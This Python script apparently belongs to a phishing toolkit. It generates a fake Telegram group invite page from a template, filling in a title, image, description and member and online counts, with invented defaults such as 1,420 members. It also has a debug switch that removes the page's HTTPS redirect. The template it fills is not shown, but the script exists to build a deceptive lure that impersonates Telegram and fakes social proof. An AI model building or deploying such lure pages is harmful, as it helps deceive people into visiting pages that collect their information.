#!/usr/bin/env python3

import os
import shutil
import utils

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

title = os.getenv('TITLE')
image = os.getenv('IMAGE')
desc = os.getenv('DESC')
mem_num = os.getenv('MEM_NUM')
online_num = os.getenv('ONLINE_NUM')

if not title:
    try:
        title = input(f'{G}[+] {C}Group Title : {W}')
    except Exception:
        title = ''
if not title:
    title = 'News & Signals Community'
utils.print(f'{G}[+] {C}Group Title :{W} ' + title)

if not image:
    try:
        image = input(f'{G}[+] {C}Image Path (Best Size : 300x300): {W}')
    except Exception:
        image = ''
if not image:
    image = 'template/telegram/images/Arrow_1x.png'
utils.print(f'{G}[+] {C}Image :{W} ' + image)

if not desc:
    try:
        desc = input(f'{G}[+] {C}Group Description: {W}')
    except Exception:
        desc = ''
if not desc:
    desc = 'Official Community Channel'
utils.print(f'{G}[+] {C}Group Description :{W} ' + desc)

if not mem_num:
    try:
        mem_num = input(G + '[+]' + C + ' Number of Members : ' + W)
    except Exception:
        mem_num = ''
if not mem_num:
    mem_num = '1,420'
utils.print(f'{G}[+] {C}Number of Members :{W} ' + mem_num)

if not online_num:
    try:
        online_num = input(G + '[+]' + C + ' Number of Members Online : ' + W)
    except Exception:
        online_num = ''
if not online_num:
    online_num = '84'
utils.print(f'{G}[+] {C}Number of Members Online :{W} ' + online_num)

img_name = None
if image.startswith('http'):
    img_name = utils.downloadImageFromUrl(image, 'template/telegram/images/')
    if img_name:
        img_name = img_name.split('/')[-1]

if not img_name:
    img_name = image.split('/')[-1]
    dest = f'template/telegram/images/{img_name}'
    try:
        if os.path.exists(image) and os.path.abspath(image) != os.path.abspath(dest):
            shutil.copyfile(image, dest)
    except Exception as e:
        utils.print('\n' + R + '[-]' + C + ' Warning : ' + W + str(e))
    if not os.path.exists(dest):
        img_name = 'Arrow_1x.png'

with open('template/telegram/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    if os.getenv("DEBUG_HTTP"):
        code = code.replace('window.location = "https:" + restOfUrl;', '')
    code = code.replace('$TITLE$', title)
    code = code.replace('$DESC$', desc)
    code = code.replace('$MEMBERS$', mem_num)
    code = code.replace('$ONLINE$', online_num)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/telegram/index.html', 'w') as new_index:
    new_index.write(code)